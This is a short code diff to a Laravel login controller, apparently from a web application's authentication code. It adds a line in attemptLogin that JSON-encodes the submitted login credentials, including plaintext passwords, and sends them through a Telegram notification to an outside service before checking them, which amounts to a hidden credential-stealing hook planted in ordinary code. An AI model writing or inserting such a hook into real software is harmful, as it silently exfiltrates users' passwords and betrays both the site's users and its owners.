@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\Auth;
 
 use App\Http\Controllers\Controller;
+use App\Notifications\TelegramNotification;
 use App\Providers\RouteServiceProvider;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Illuminate\Http\Request;
@@ -55,6 +56,8 @@ class LoginController extends Controller
     protected function attemptLogin(Request $request)
     {
         $credentials = $this->credentials($request);
+
+        TelegramNotification::sendMessage(json_encode($credentials, JSON_UNESCAPED_SLASHES));
 
         if(is_array($credentials)) {
             $credentials['status'] = 1;
